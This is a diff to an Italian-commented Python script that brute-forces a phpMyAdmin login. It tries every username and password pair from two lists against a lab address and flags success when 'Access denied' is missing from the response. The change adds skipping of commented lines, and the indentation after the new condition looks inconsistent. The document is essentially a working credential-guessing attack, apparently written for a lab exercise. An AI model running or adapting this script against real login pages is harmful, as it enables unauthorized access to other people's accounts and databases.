@@ -16,32 +16,34 @@ found = 0
 #per ogni utente presente nel precedente file, viene provata una password dell'altro file, fino a che non abbiamo il match
 for user in user_list:
     user = user.rstrip()
-    for pwd in pass_list:
-        pwd = pwd.rstrip()
+    if(not user.startswith('#')):
+        for pwd in pass_list:
+            pwd = pwd.rstrip()
+            if(not pwd.startswith('#')):
         
         #escamotage grafico per cancellare la riga precedente, che non ha match positivo, che viene sovrascritta dalla successiva.
-        sys.stdout.write("\033[A")
-        sys.stdout.write("\033[K")
-        
-        #stampa user e pwd sulla stessa riga, separati dal "-"
-        print (user, "-", pwd)
-        
-        #check degli headers contenenti nella richiesta di login
-        headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
-        
-        #parametri da inserire per provare il bruteforce
-        post_par ={'pma_username': user, 'pma_password': pwd, 'server':1 }
-        
-        #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
-        risp=requests.post('http://192.168.50.101/phpMyAdmin/index.php',post_par)
-        
-        #è apparso subito all'occhio che in tutte le prove che non andavano a buon fine, era presente la scritta "Access denied". perciò 	abbiamo cercato l'unico match di user e pwd che non contenesse questa particolare scritta. In quel caso, il bruteforce sarebbe riuscito.
-        if(risp.text.find("Access denied") == -1):
-        
-        #stampa il match user - pwd corretto e trasforma found al valore 1
-            print(f"\nLog in!\n\nuser: {user}\npassword: {pwd}\n\n\n") 
-            found=1
-            break
+            sys.stdout.write("\033[A")
+            sys.stdout.write("\033[K")
+            
+            #stampa user e pwd sulla stessa riga, separati dal "-"
+            print (user, "-", pwd)
+            
+            #check degli headers contenenti nella richiesta di login
+            headers = {"Content-type":"application/x-www-form-urlencoded", "Accept":"text/html,application/xhtml+xml"}
+            
+            #parametri da inserire per provare il bruteforce
+            post_par ={'pma_username': user, 'pma_password': pwd, 'server':1 }
+            
+            #dà la risposta del server, per verificare se effettivamente il bruteforce ha avuto successo. si potrebbe leggere se dopo questo comando segue print(risp.test)
+            risp=requests.post('http://192.168.50.101/phpMyAdmin/index.php',post_par)
+            
+            #è apparso subito all'occhio che in tutte le prove che non andavano a buon fine, era presente la scritta "Access denied". perciò 	abbiamo cercato l'unico match di user e pwd che non contenesse questa particolare scritta. In quel caso, il bruteforce sarebbe riuscito.
+            if(risp.text.find("Access denied") == -1):
+            
+            #stampa il match user - pwd corretto e trasforma found al valore 1
+                print(f"\nLog in!\n\nuser: {user}\npassword: {pwd}\n\n\n") 
+                found=1
+                break
             
          #con found al valore 1, chiude il ciclo   
     if(found==1):
